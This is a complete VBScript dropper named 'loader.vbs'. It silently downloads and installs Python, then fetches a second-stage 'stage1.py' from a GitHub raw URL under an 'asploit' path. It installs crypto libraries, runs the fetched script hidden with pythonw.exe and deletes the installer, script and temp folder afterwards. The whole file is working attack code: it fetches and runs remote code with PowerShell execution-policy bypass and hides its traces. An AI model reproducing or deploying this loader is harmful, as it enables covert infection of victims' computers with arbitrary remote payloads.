' loader.vbs
' Single-file script to download Python, a Python script, install libraries, and execute the script silently

' Variables
Dim PYTHON_URL, SCRIPT_URL, INSTALL_DIR, TEMP_DIR, PYTHON_INSTALLER, SCRIPT_NAME
PYTHON_URL = "https://www.python.org/ftp/python/3.11.7/python-3.11.7-amd64.exe"
SCRIPT_URL = "https://raw.githubusercontent.com/blockbastaz/ressources/refs/heads/main/asploit/stage1.py" ' Example GitHub raw URL
INSTALL_DIR = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%ProgramFiles%") & "\Python311"
TEMP_DIR = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\tmp_" & Int((9999 * Rnd) + 1000)
PYTHON_INSTALLER = "py_" & Int((9999 * Rnd) + 1000) & ".exe"
SCRIPT_NAME = "client.py"

' Create a shell object for running commands
Dim WShell
Set WShell = CreateObject("WScript.Shell")

' Create temp directory silently
CreateObject("Scripting.FileSystemObject").CreateFolder TEMP_DIR

' Function to run PowerShell commands silently
Function RunPowerShellCommand(command)
    WShell.Run "powershell.exe -ExecutionPolicy Bypass -Command """ & command & """", 0, True
End Function

' Check if Python is already installed
Dim pythonFound
pythonFound = False
On Error Resume Next
WShell.Run "python --version", 0, True
If Err.Number = 0 Then
    pythonFound = True
End If
On Error GoTo 0

' Download and install Python if not found
If Not pythonFound Then
    ' Download Python installer
    RunPowerShellCommand "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '" & PYTHON_URL & "' -OutFile '" & TEMP_DIR & "\" & PYTHON_INSTALLER & "' -UseBasicParsing"

    ' Check if download succeeded
    If Not CreateObject("Scripting.FileSystemObject").FileExists(TEMP_DIR & "\" & PYTHON_INSTALLER) Then
        WScript.Quit 1
    End If

    ' Install Python silently
    WShell.Run """" & TEMP_DIR & "\" & PYTHON_INSTALLER & """ /quiet InstallAllUsers=1 PrependPath=1 TargetDir=""" & INSTALL_DIR & """", 0, True

    ' Update PATH for the current session
    WShell.Environment("PROCESS")("PATH") = WShell.Environment("PROCESS")("PATH") & ";" & INSTALL_DIR & ";" & INSTALL_DIR & "\Scripts"
End If

' Verify Python is available
On Error Resume Next
WShell.Run "python --version", 0, True
If Err.Number <> 0 Then
    WScript.Quit 1
End If
On Error GoTo 0

' Download the Python script from GitHub raw URL
RunPowerShellCommand "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '" & SCRIPT_URL & "' -OutFile '" & TEMP_DIR & "\" & SCRIPT_NAME & "' -UseBasicParsing"

' Check if download succeeded
If Not CreateObject("Scripting.FileSystemObject").FileExists(TEMP_DIR & "\" & SCRIPT_NAME) Then
    WScript.Quit 1
End If

' Install required libraries silently
WShell.Run """" & INSTALL_DIR & "\python.exe"" -m pip install --quiet pyaesm urllib3 pycryptodome ", 0, True

' Execute the script in the background with pythonw.exe (no console window)
WShell.Run """" & INSTALL_DIR & "\pythonw.exe"" """ & TEMP_DIR & "\" & SCRIPT_NAME & """", 0, False

' Cleanup
If CreateObject("Scripting.FileSystemObject").FileExists(TEMP_DIR & "\" & PYTHON_INSTALLER) Then
    CreateObject("Scripting.FileSystemObject").DeleteFile TEMP_DIR & "\" & PYTHON_INSTALLER
End If
If CreateObject("Scripting.FileSystemObject").FileExists(TEMP_DIR & "\" & SCRIPT_NAME) Then
    CreateObject("Scripting.FileSystemObject").DeleteFile TEMP_DIR & "\" & SCRIPT_NAME
End If
CreateObject("Scripting.FileSystemObject").DeleteFolder TEMP_DIR

' Exit
WScript.Quit 0